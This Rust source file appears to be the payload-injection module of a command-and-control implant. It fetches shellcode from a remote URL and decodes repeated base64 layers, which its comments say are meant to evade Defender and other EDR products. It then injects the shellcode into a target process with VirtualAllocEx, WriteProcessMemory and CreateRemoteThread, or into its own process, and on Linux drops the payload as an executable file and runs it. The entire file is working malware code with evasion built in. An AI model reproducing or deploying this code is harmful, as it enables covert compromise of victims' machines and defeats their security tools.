use std::error::Error;
use crate::logger::Logger;
use crate::cmd::CommandArgs;
use memmap2::MmapMut;

use base64::decode as b64_decode;
#[cfg(windows)] extern crate winapi;
#[cfg(windows)] extern crate kernel32;
#[cfg(windows)] use winapi::um::winnt::{
    PROCESS_ALL_ACCESS,
    MEM_COMMIT,
    MEM_RESERVE,
    PAGE_EXECUTE_READWRITE,
    PAGE_EXECUTE_READ,
    PAGE_READWRITE,
    PVOID
};
#[cfg(windows)] use winapi::um::{
    errhandlingapi,
    processthreadsapi,
    winbase, 
    synchapi::WaitForSingleObject
};
#[cfg(windows)] use std::ptr;
use reqwest::Client;

/// Handles the retrieval and deobfuscation of shellcode from a url.
// #[cfg(windows)]
async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, &str> {
    // Download shellcode, or try to
    let client = Client::new();
    if let Ok(r) = client.get(url).send().await {
        if r.status().is_success() {   
            logger.info(format!("Got the shellcode")); 
            // Get the shellcode. Now we have to decode it
            let mut shellcode_encoded: Vec<u8>;
            let mut shellcode_string: String;
            let mut shellcode: Vec<u8>;
            if let Ok(sc) = r.text().await {
                shellcode_encoded = Vec::from(sc.trim().as_bytes());
                logger.info(format!("Got encoded bytes"));
                for i in 0..b64_iterations {
                    logger.debug(format!("Decode iteration: {i}"));
                    match b64_decode(shellcode_encoded) {
                        Ok(d) => {
                            shellcode_encoded = d
                                .into_iter()
                                .filter(|&b| b != 0x0a)
                                .collect();
                        },
                        Err(e) => { 
                            let err_msg = e.to_string();
                            logger.err(format!("{}", err_msg.to_owned()));
                            return Err("Could not decode shellcode"); 
                        }
                    };
                    
                }
                // Convert bytes to our proper string
                if let Ok(s) = String::from_utf8(shellcode_encoded) {
                    shellcode_string = s;
                } else {
                    let err_msg = "Could not convert shellcode bytes to string";
                    logger.err(err_msg.to_string());
                    return Err("Could not convert shellcode bytes to string");
                }
                // At this point, we have the comma-separated "0xNN" form of the shellcode.
                // We need to get each one until a proper u8.
                shellcode = shellcode_string
                    .split(",")
                    .map(|s| s.replace("0x", ""))
                    .map(|s| s.replace(" ", ""))                    
                    .map(|s|{ 
                        match u8::from_str_radix(&s, 16) {
                            Ok(b) => b,
                            Err(_) => 0
                        }
                    })
                    .collect();
                
                // The actual success
                return Ok(shellcode);

            } else {
                let err_msg = "Could not decode shellcode";
                logger.err(err_msg.to_string());
                return Err(err_msg);
            }

        } else {
            return Err("Could not download shellcode");
        }   

    } else {
        return Err("Could not download shellcode");
    }
} 

/// Shellcode-based attacks for further compromise.
/// 
/// On Windows, this will attempt process injection.
/// 
/// To avoid shellcode detection by Defender and other EDRs,
/// the shellcode is expected to be b64-encoded, comma-separated hex representations
/// of the shellcode, which is decoded at runtime.
/// 
/// The shellcode can be encoded `b64_iterations` times to make extra work for EDRs to process the payload.
/// This has proven effective in initial evasion.
/// 
/// ### Examples
/// Usage: `inject [shellcode_method] [shellcode_url] [b64_iterations] [[pid]] 🎯`
/// 
/// On Linux, the payload will be downloaded and executed like a regular dropper.
#[cfg(windows)] 
pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {

    if let Some(inject_type) = cmd_args.nth(0) {

        // Set up our variables; each one could fail on us.
        // Yes this is a lot of verbose error checking, but this
        // has to be rock solid or the agent will die.
        let mut url: String;
        let mut b64_iterations: u32;

        // Get URL
        match cmd_args.nth(0) {
            Some(u) => { 
                logger.debug(format!("Shellcode URL: {}", &u));
                url = u; 
            },
            None    => { return Ok("Could not parse URL".to_string()); }
        };

        // Get b64_iterations
        match cmd_args.nth(0) {
            Some(bs) => {
                if let Ok(b) = bs.parse::<u32>() {
                    b64_iterations = b;
                } else {
                    return Ok("Could not parse b64 iterations".to_string());
                }
            },
            None => { return Ok("Could not extract b64 iterations".to_string()); }
        };

        // CALL get_shellcode

        match inject_type.as_str() {
            "remote" => {
                // Get shellcode
                let mut shellcode: Vec<u8>; 
                match get_shellcode(url, b64_iterations, logger).await {
                    Ok(s) => { shellcode = s},
                    Err(e) => { return Ok(e.to_string()); }
                };
                let mut pid: u32;
                // Get pid
                match cmd_args.nth(0) {
                    Some(ps) => {
                        if let Ok(p) = ps.parse::<u32>() {
                            logger.debug(format!("Injecting into PID: {:?}", &p));
                            pid = p;
                            // Big thanks to trickster0
                            // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
                            unsafe {
                                let h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
                                let addr = kernel32::VirtualAllocEx(h, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
                                let mut n = 0;
                                kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
                                let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
                                kernel32::CloseHandle(h);
                            }
                            return Ok("Injection completed!".to_string());
                        } else {
                            let err_msg = "Could not parse PID";
                            logger.err(err_msg.to_string());
                            return Ok(err_msg.to_string());
                        }
                    },
                    None => { 
                        let err_msg = "Could not extract PID";
                        logger.err(err_msg.to_string());
                        return Ok(err_msg.to_string()); 
                    }
                };
            },
            "self"  => {
                type DWORD = u32;

                // Get shellcode
                let mut shellcode: Vec<u8>; 
                match get_shellcode(url, b64_iterations, logger).await {
                    Ok(s) => { shellcode = s},
                    Err(e) => { return Ok(e.to_string()) }
                };

                logger.debug(format!("Injecting into current process..."));
                unsafe {
                    let base_addr = kernel32::VirtualAlloc(
                        ptr::null_mut(),
                        shellcode.len().try_into().unwrap(),
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_READWRITE,
                    );

                    if base_addr.is_null() {
                        logger.err("Couldn't allocate memory to current proc.".to_string())
                    } else {
                        logger.debug("Allocated memory to current proc.".to_string());
                    }

                    // copy shellcode into mem
                    logger.debug("Copying Shellcode to address in current proc.".to_string());
                    std::ptr::copy(shellcode.as_ptr() as _, base_addr, shellcode.len());
                    logger.debug("Copied...".to_string());

                    // Flip mem protections from RW to RX with VirtualProtect. Dispose of the call with `out _`
                    logger.debug("Changing mem protections to RX...".to_string());

                    let mut old_protect: DWORD = PAGE_READWRITE;

                    let mem_protect = kernel32::VirtualProtect(
                        base_addr,
                        shellcode.len() as u64,
                        PAGE_EXECUTE_READ,
                        &mut old_protect,
                    );

                    if mem_protect == 0 {
                        let error = errhandlingapi::GetLastError();
                        return Ok(format!("Error: {error}"));
                    }

                    // Call CreateThread
                    logger.debug("Calling CreateThread...".to_string());

                    let mut tid = 0;
                    let ep: extern "system" fn(PVOID) -> u32 = { std::mem::transmute(base_addr) };

                    let h_thread = processthreadsapi::CreateThread(
                        ptr::null_mut(),
                        0,
                        Some(ep),
                        ptr::null_mut(),
                        0,
                        &mut tid,
                    );

                    if h_thread.is_null() {
                        let error = unsafe { errhandlingapi::GetLastError() };
                        logger.err(format!("{error}"));
                    } else {
                        logger.info(format!("Thread Id: {tid}"));
                    }

                    // CreateThread is not a blocking call, so we wait on the thread indefinitely with WaitForSingleObject. This blocks for as long as the thread is running
                    // I do not know if this will have side effects, but if you omit the WaitForSingleObject call, the ON agent can continue to function after the thread injection takes place.
                    
                    //logger.debug("Calling WaitForSingleObject...".to_string());

                    //let status = WaitForSingleObject(h_thread, winbase::INFINITE);
                    //if status == 0 {
                    //    logger.info("Good!".to_string())
                    //} else {
                    //    let error = errhandlingapi::GetLastError();
                    //    logger.err(format!("{error}"));
                    //}
                }

                return Ok("Injection completed!".to_string());
                
            },
            _ => Ok("Unknown injection type!".to_string())
        }

    } else {
        return Ok("Could not parse URL".to_string());
    }
    
         
}

#[cfg(not(windows))]
pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
    
    if let Some(inject_type) = cmd_args.nth(0) {

        // Set up our variables; each one could fail on us.
        // Yes this is a lot of verbose error checking, but this
        // has to be rock solid or the agent will die.
        let mut url: String;
        let mut b64_iterations: u32;

        match inject_type.as_str() {
            "mmap" => {
                use std::fs::OpenOptions;
                use std::os::unix::fs::PermissionsExt;
                use crate::cmd::shell;
                
                // Get URL
                match cmd_args.nth(0) {
                    Some(u) => { 
                        logger.debug(format!("Shellcode URL: {}", &u));
                        url = u; 
                    },
                    None    => { return Ok("Could not parse URL".to_string()); }
                };

                // Get b64_iterations
                match cmd_args.nth(0) {
                    Some(bs) => {
                        if let Ok(b) = bs.parse::<u32>() {
                            b64_iterations = b;
                        } else {
                            return Ok("Could not parse b64 iterations".to_string());
                        }
                    },
                    None => { return Ok("Could not extract b64 iterations".to_string()); }
                };
                
                // Get shellcode
                let mut shellcode: Vec<u8>; 
                match get_shellcode(url, b64_iterations, logger).await {
                    Ok(s) => { shellcode = s},
                    Err(e) => { return Ok(e.to_string()); }
                };


                let file_name = "blargh";
                let file = OpenOptions::new()
                    .read(true)
                    .write(true)
                    .create(true)
                    .open(file_name)?;

                
                file.set_permissions(PermissionsExt::from_mode(0o755))?;
                file.set_len(shellcode.len().try_into().unwrap())?;

                let mut mmap = unsafe { MmapMut::map_mut(&file)? };
                mmap.copy_from_slice(shellcode.as_slice());
                mmap.make_exec()?;
                
                let mut shell_arg = CommandArgs::from_string(file_name.to_string());
                shell::handle(&mut shell_arg).await?;
                
                return Ok("MMMMap".to_string());
            },
            _ => { return Ok("Unknown injection method!".to_string()) ;}
        }

    } else {
        return Ok("No injection type provided!".to_string());
    }
}